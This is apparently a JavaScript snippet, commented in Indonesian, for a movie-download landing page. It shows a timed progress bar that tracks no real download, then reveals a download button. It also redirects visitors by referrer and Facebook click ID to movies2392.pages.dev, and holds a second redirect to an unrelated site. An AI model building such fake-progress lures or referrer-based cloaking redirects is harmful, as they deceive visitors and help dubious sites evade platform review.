    // Mendapatkan elemen progress bar
    var progressBar = document.querySelector('.progress-bar');
    // Mendapatkan elemen tombol download
    var downloadButtonContainer = document.getElementById('button-container');

    // Membuat fungsi untuk menganimasikan progress bar
    function animateProgressBar() {
        var width = 1; // Nilai awal lebar progress bar
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval); // Menghentikan interval jika lebar sudah mencapai 100%
                downloadButtonContainer.style.display = 'block'; // Menampilkan tombol download
            } else {
                width++; // Meningkatkan nilai lebar progress bar
                progressBar.style.width = width + '%'; // Mengatur lebar progress bar
                progressBar.innerText = width + '%'; // Menampilkan angka persentase di dalam progress bar
                progressBar.setAttribute('aria-valuenow', width); // Mengatur nilai persentase untuk aksesibilitas
            }
        }, 50); // Interval animasi
    }

    // Memanggil fungsi untuk memulai animasi progress bar
    animateProgressBar();

// Fungsi untuk mendapatkan parameter dari URL
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

// Mendapatkan nilai parameter 'fbclid' dari URL
var fbclid = getParameterByName('fbclid');

// Mendapatkan domain utama (tanpa protokol)
var mainDomain = window.location.hostname.split('.').slice(-2).join('.');

// Menentukan apakah pengguna datang dari Facebook atau tidak
var dariFacebook = fbclid !== null;

// Memeriksa apakah referrer berasal dari movies2392.pages.dev atau apakah pengguna berada di domain utama atau datang dari Facebook
if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain || dariFacebook) {
    // Tidak melakukan redirect, biarkan pengguna tetap di situs
} else {
    // Redirect ke movies2392.pages.dev
    window.location.href = "https://movies2392.pages.dev";
}

function redirectToURL() {
    window.location.href = 'https://crm.faridahdecoration.com/';
}





